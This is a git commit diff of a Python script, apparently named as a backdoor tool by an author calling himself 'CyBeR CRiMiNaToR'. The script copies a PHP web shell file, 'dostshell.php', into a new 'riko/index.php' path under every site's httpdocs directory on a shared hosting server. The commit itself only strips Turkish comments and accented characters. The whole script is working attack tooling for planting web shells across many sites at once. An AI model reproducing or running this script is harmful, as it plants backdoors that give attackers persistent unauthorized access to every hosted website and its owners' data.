5bb248b45202eccd754446f36f3b2e6f0382c575
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2024-11-23 03:51:31 +0400

    Update and rename backtirdizzz.py to backtirdz.py

--- backtirdz.py
+++ backtirdz.py
@@ -2,26 +2,20 @@ import glob
 import os
 import shutil
 
-# Kaynak dosya
 source_file = '/var/www/vhosts/dostshell.php'
 
-# Tüm /httpdocs/ dizinlerini bul
 for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
     try:
-        # Yeni alt klasör yolu
         new_folder = os.path.join(target_dir, 'riko')
         
-        # Alt klasörü oluştur (mevcutsa hata vermez)
         if not os.path.exists(new_folder):
             os.makedirs(new_folder)
         
-        # Yeni dosyanın yolu
         new_file_path = os.path.join(new_folder, 'index.php')
         
-        # Kaynak dosyayı yeni adıyla kopyala
         shutil.copy(source_file, new_file_path)
         
-        print("{}, {} olarak kopyalandı.".format(source_file, new_file_path))
+        print("{}, {} olarak kopyalandi.".format(source_file, new_file_path))
     
     except Exception as e:
-        print("Hata: {} içinde dosya oluşturulamadı. {}".format(target_dir, e))
+        print("Hata: {} icinde dosya oluşturulamadi. {}".format(target_dir, e))
